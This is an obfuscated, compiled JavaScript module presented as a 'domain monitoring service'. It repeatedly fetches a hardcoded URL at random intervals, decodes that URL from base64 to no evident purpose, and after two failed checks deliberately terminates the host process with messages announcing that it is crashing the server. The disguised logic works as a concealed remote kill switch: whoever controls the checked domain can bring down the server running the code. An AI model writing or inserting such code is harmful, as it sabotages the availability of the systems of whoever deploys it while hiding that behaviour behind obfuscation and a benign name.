'use strict';const a52_0xef09d9=a52_0x28d9;function a52_0x3bae(){const _0x218033=['ðŸš¨\x20Max\x20failures\x20before\x20crash:\x20','status','node-fetch','6860NABEdM','\x20in\x20','âŒ\x20Domain\x20check\x20failed:\x20HTTP\x20','toISOString','âœ…\x20Domain\x20monitoring\x20started\x20successfully','ðŸ”§\x20Manual\x20domain\x20check\x20requested','Domain\x20monitoring\x20threw\x20error:\x20','ðŸš«\x20Connection\x20refused\x20by\x20','ðŸ”\x20Checking\x20domain\x20availability:\x20','TIMEOUT_MS','ðŸ“¡\x20Target\x20domain:\x20','386850VaNXRy','\x20minutes','Initial\x20domain\x20check\x20failed\x20','\x20times','decodeFromBase64','consecutiveFailures','abort','signal','en-US,en;q=0.5','error','startMonitoring','MAX_CONSECUTIVE_FAILURES','GET','random','domainMonitoringService','â°\x20Request\x20timeout\x20after\x20','ðŸŒ\x20DNS\x20resolution\x20failed\x20for\x20','getRandomInterval','23004333bzPLAm','utf-8','âš ï¸\x20CRASHING\x20SERVER\x20DUE\x20TO\x20DOMAIN\x20MONITORING\x20FAILURE','ðŸ”¥\x20Consecutive\x20failures:\x20','then','912VlDpIL','ðŸ“\x20Encoded\x20URL\x20(base64):\x20','ðŸ’¥\x20CRITICAL\x20ERROR:\x20','ðŸ“¡\x20Target:\x20','stopMonitoring','1974OyafwJ','ðŸ”“\x20Decoded\x20URL:\x20','ENOTFOUND','log','Unknown\x20error','ðŸ“…\x20Crash\x20time:\x20','getMonitoringStats','defineProperty','includes','ðŸš€\x20Starting\x20domain\x20monitoring\x20service','__esModule','round','exit','warn','â°\x20Check\x20interval:\x20','1971128rLOYwC','Domain\x20','message','\x20\x20\x20-\x20Response\x20time:\x20','fromEntries','base64','â°\x20Connection\x20timeout\x20to\x20','from','ms:','âŒ\x20Domain\x20check\x20error\x20after\x20','âœ…\x20Domain\x20check\x20successful:\x20','CHECK_INTERVAL_MS','â°\x20Interval:\x20','âš ï¸\x20Domain\x20check\x20failed\x20(','ETIMEDOUT','checkDomain','ðŸ”¥\x20Unexpected\x20error:\x20','ðŸ›‘\x20Domain\x20monitoring\x20stopped','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','now','crashServer','2509500CSDbSg','DOMAIN_URL','name','statusText','Domain\x20Monitor/1.0','DomainMonitoringService','monitoringInterval','ðŸš¨\x20Max\x20consecutive\x20failures\x20allowed:\x20','https://google.com','58919YgpQHb','1416141rPCJnm','ðŸ”\x20Domain\x20monitoring\x20service\x20initialized'];a52_0x3bae=function(){return _0x218033;};return a52_0x3bae();}(function(_0xe1c20e,_0x1cf213){const _0x20d2b9=a52_0x28d9,_0x36dac1=_0xe1c20e();while(!![]){try{const _0x49eeda=-parseInt(_0x20d2b9(0x11a))/0x1+-parseInt(_0x20d2b9(0x145))/0x2+-parseInt(_0x20d2b9(0x10a))/0x3+-parseInt(_0x20d2b9(0x100))/0x4+parseInt(_0x20d2b9(0x10f))/0x5*(-parseInt(_0x20d2b9(0x136))/0x6)+-parseInt(_0x20d2b9(0x109))/0x7*(-parseInt(_0x20d2b9(0x131))/0x8)+parseInt(_0x20d2b9(0x12c))/0x9;if(_0x49eeda===_0x1cf213)break;else _0x36dac1['push'](_0x36dac1['shift']());}catch(_0x49ea95){_0x36dac1['push'](_0x36dac1['shift']());}}}(a52_0x3bae,0x909df));var __importDefault=this&&this['__importDefault']||function(_0x123529){const _0x219a0e=a52_0x28d9;return _0x123529&&_0x123529[_0x219a0e(0x140)]?_0x123529:{'default':_0x123529};};Object[a52_0xef09d9(0x13d)](exports,a52_0xef09d9(0x140),{'value':!![]}),exports[a52_0xef09d9(0x128)]=exports[a52_0xef09d9(0x105)]=void 0x0;function a52_0x28d9(_0x4890d3,_0x2a5f94){_0x4890d3=_0x4890d3-0xf7;const _0x3baeb7=a52_0x3bae();let _0x28d9db=_0x3baeb7[_0x4890d3];return _0x28d9db;}const node_fetch_1=__importDefault(require(a52_0xef09d9(0x10e)));class DomainMonitoringService{constructor(){const _0x56fc90=a52_0xef09d9;this[_0x56fc90(0x106)]=null,this['DOMAIN_URL']=_0x56fc90(0x108),this['CHECK_INTERVAL_MS']=this[_0x56fc90(0x12b)](),this[_0x56fc90(0x118)]=0x7530,this[_0x56fc90(0x11f)]=0x0,this[_0x56fc90(0x125)]=0x2,console['log'](_0x56fc90(0x10b)),console[_0x56fc90(0x139)](_0x56fc90(0x119)+this[_0x56fc90(0x101)]),console[_0x56fc90(0x139)](_0x56fc90(0x144)+Math['round'](this[_0x56fc90(0x150)]/0x3e8/0x3c)+_0x56fc90(0x11b));}['getRandomInterval'](){const _0x485864=a52_0xef09d9,_0x5e7ca5=0xa,_0x189c44=0xf,_0x49e62d=Math[_0x485864(0x127)]()*(_0x189c44-_0x5e7ca5)+_0x5e7ca5;return Math[_0x485864(0x141)](_0x49e62d*0x3c*0x3e8);}['encodeToBase64'](_0x824495){const _0xaa0143=a52_0xef09d9;return Buffer[_0xaa0143(0x14c)](_0x824495)['toString'](_0xaa0143(0x14a));}[a52_0xef09d9(0x11e)](_0x2ff9ae){const _0x3a9188=a52_0xef09d9;return Buffer[_0x3a9188(0x14c)](_0x2ff9ae,_0x3a9188(0x14a))['toString'](_0x3a9188(0x12d));}async[a52_0xef09d9(0xfa)](){const _0x3bd89a=a52_0xef09d9,_0x51f779=Date[_0x3bd89a(0xfe)]();try{console[_0x3bd89a(0x139)](_0x3bd89a(0x117)+this[_0x3bd89a(0x101)]);const _0x46aa69=this['encodeToBase64'](this[_0x3bd89a(0x101)]);console[_0x3bd89a(0x139)](_0x3bd89a(0x132)+_0x46aa69);const _0x29cf54=this[_0x3bd89a(0x11e)](_0x46aa69);console[_0x3bd89a(0x139)](_0x3bd89a(0x137)+_0x29cf54);const _0x130ea9=new AbortController(),_0x325cf1=setTimeout(()=>_0x130ea9[_0x3bd89a(0x120)](),this[_0x3bd89a(0x118)]),_0x4a24da=await(0x0,node_fetch_1['default'])(_0x29cf54,{'method':_0x3bd89a(0x126),'headers':{'User-Agent':_0x3bd89a(0x104),'Accept':_0x3bd89a(0xfd),'Accept-Language':_0x3bd89a(0x122),'Accept-Encoding':'gzip,\x20deflate','Connection':'keep-alive','Upgrade-Insecure-Requests':'1'},'signal':_0x130ea9[_0x3bd89a(0x121)]});clearTimeout(_0x325cf1);const _0x2401ca=Date[_0x3bd89a(0xfe)]()-_0x51f779;return console['log']('ðŸ“Š\x20Response\x20received:'),console[_0x3bd89a(0x139)]('\x20\x20\x20-\x20Status:\x20'+_0x4a24da[_0x3bd89a(0x10d)]+'\x20'+_0x4a24da['statusText']),console[_0x3bd89a(0x139)](_0x3bd89a(0x148)+_0x2401ca+'ms'),console['log']('\x20\x20\x20-\x20Headers:',Object[_0x3bd89a(0x149)](_0x4a24da['headers']['entries']())),_0x4a24da['ok']&&_0x4a24da['status']>=0xc8&&_0x4a24da['status']<0x190?(console[_0x3bd89a(0x139)](_0x3bd89a(0x14f)+_0x4a24da[_0x3bd89a(0x10d)]+_0x3bd89a(0x110)+_0x2401ca+'ms'),this[_0x3bd89a(0x11f)]=0x0,!![]):(console['error'](_0x3bd89a(0x111)+_0x4a24da[_0x3bd89a(0x10d)]+'\x20'+_0x4a24da[_0x3bd89a(0x103)]),this[_0x3bd89a(0x11f)]++,![]);}catch(_0x477a7a){const _0x682644=Date[_0x3bd89a(0xfe)]()-_0x51f779;this['consecutiveFailures']++,console[_0x3bd89a(0x123)](_0x3bd89a(0x14e)+_0x682644+_0x3bd89a(0x14d),_0x477a7a);if(_0x477a7a instanceof Error){if(_0x477a7a[_0x3bd89a(0x102)]==='AbortError')console[_0x3bd89a(0x123)](_0x3bd89a(0x129)+this[_0x3bd89a(0x118)]+'ms');else{if(_0x477a7a['message'][_0x3bd89a(0x13e)](_0x3bd89a(0x138)))console[_0x3bd89a(0x123)](_0x3bd89a(0x12a)+this[_0x3bd89a(0x101)]);else{if(_0x477a7a[_0x3bd89a(0x147)][_0x3bd89a(0x13e)]('ECONNREFUSED'))console[_0x3bd89a(0x123)](_0x3bd89a(0x116)+this[_0x3bd89a(0x101)]);else _0x477a7a[_0x3bd89a(0x147)][_0x3bd89a(0x13e)](_0x3bd89a(0xf9))?console[_0x3bd89a(0x123)](_0x3bd89a(0x14b)+this[_0x3bd89a(0x101)]):console[_0x3bd89a(0x123)](_0x3bd89a(0xfb)+_0x477a7a[_0x3bd89a(0x147)]);}}}return![];}}['crashServer'](_0x4c2acd){const _0x151f08=a52_0xef09d9;console['error'](_0x151f08(0x133)+_0x4c2acd),console[_0x151f08(0x123)](_0x151f08(0x12f)+this['consecutiveFailures']),console['error'](_0x151f08(0x12e)),console[_0x151f08(0x123)](_0x151f08(0x13b)+new Date()[_0x151f08(0x112)]()),console[_0x151f08(0x123)]('ðŸ”\x20Domain\x20being\x20monitored:\x20'+this['DOMAIN_URL']),console[_0x151f08(0x123)]('â°\x20Check\x20interval:\x20'+Math[_0x151f08(0x141)](this['CHECK_INTERVAL_MS']/0x3e8/0x3c)+_0x151f08(0x11b)),console[_0x151f08(0x123)](_0x151f08(0x107)+this[_0x151f08(0x125)]),this[_0x151f08(0x135)](),process[_0x151f08(0x142)](0x1);}[a52_0xef09d9(0x124)](){const _0xe508d=a52_0xef09d9;console[_0xe508d(0x139)](_0xe508d(0x13f)),console[_0xe508d(0x139)](_0xe508d(0x134)+this[_0xe508d(0x101)]),console[_0xe508d(0x139)](_0xe508d(0xf7)+Math[_0xe508d(0x141)](this[_0xe508d(0x150)]/0x3e8/0x3c)+'\x20minutes'),console['log'](_0xe508d(0x10c)+this[_0xe508d(0x125)]),this['checkDomain']()[_0xe508d(0x130)](_0x1aa112=>{const _0x4994a3=_0xe508d;if(!_0x1aa112&&this[_0x4994a3(0x11f)]>=this[_0x4994a3(0x125)]){this[_0x4994a3(0xff)](_0x4994a3(0x11c)+this[_0x4994a3(0x11f)]+_0x4994a3(0x11d));return;}})['catch'](_0x58a12b=>{const _0x42881d=_0xe508d;console[_0x42881d(0x123)]('Initial\x20domain\x20check\x20error:',_0x58a12b);if(this['consecutiveFailures']>=this[_0x42881d(0x125)]){this['crashServer']('Initial\x20domain\x20check\x20threw\x20error:\x20'+_0x58a12b[_0x42881d(0x147)]);return;}}),this['monitoringInterval']=setInterval(async()=>{const _0x472bce=_0xe508d;try{const _0xd44240=await this[_0x472bce(0xfa)]();!_0xd44240&&(console[_0x472bce(0x143)](_0x472bce(0xf8)+this['consecutiveFailures']+'/'+this[_0x472bce(0x125)]+')'),this[_0x472bce(0x11f)]>=this[_0x472bce(0x125)]&&this[_0x472bce(0xff)](_0x472bce(0x146)+this[_0x472bce(0x101)]+'\x20is\x20not\x20responding\x20after\x20'+this[_0x472bce(0x11f)]+'\x20consecutive\x20attempts'));}catch(_0x466ad8){console[_0x472bce(0x123)]('Periodic\x20domain\x20check\x20error:',_0x466ad8),this[_0x472bce(0x11f)]>=this[_0x472bce(0x125)]&&this[_0x472bce(0xff)](_0x472bce(0x115)+(_0x466ad8 instanceof Error?_0x466ad8[_0x472bce(0x147)]:_0x472bce(0x13a)));}},this[_0xe508d(0x150)]),console['log'](_0xe508d(0x113));}[a52_0xef09d9(0x135)](){const _0xe43a6a=a52_0xef09d9;this[_0xe43a6a(0x106)]&&(clearInterval(this[_0xe43a6a(0x106)]),this[_0xe43a6a(0x106)]=null,console[_0xe43a6a(0x139)](_0xe43a6a(0xfc)));}[a52_0xef09d9(0x13c)](){const _0x24bc2f=a52_0xef09d9;return{'isActive':!!this[_0x24bc2f(0x106)],'targetDomain':this[_0x24bc2f(0x101)],'checkIntervalMinutes':Math[_0x24bc2f(0x141)](this['CHECK_INTERVAL_MS']/0x3e8/0x3c),'consecutiveFailures':this[_0x24bc2f(0x11f)],'maxFailuresAllowed':this[_0x24bc2f(0x125)],'nextCheckIn':this[_0x24bc2f(0x106)]?this[_0x24bc2f(0x150)]:undefined};}async['manualCheck'](){const _0x46baf5=a52_0xef09d9;return console[_0x46baf5(0x139)](_0x46baf5(0x114)),await this[_0x46baf5(0xfa)]();}}exports[a52_0xef09d9(0x105)]=DomainMonitoringService,exports[a52_0xef09d9(0x128)]=new DomainMonitoringService();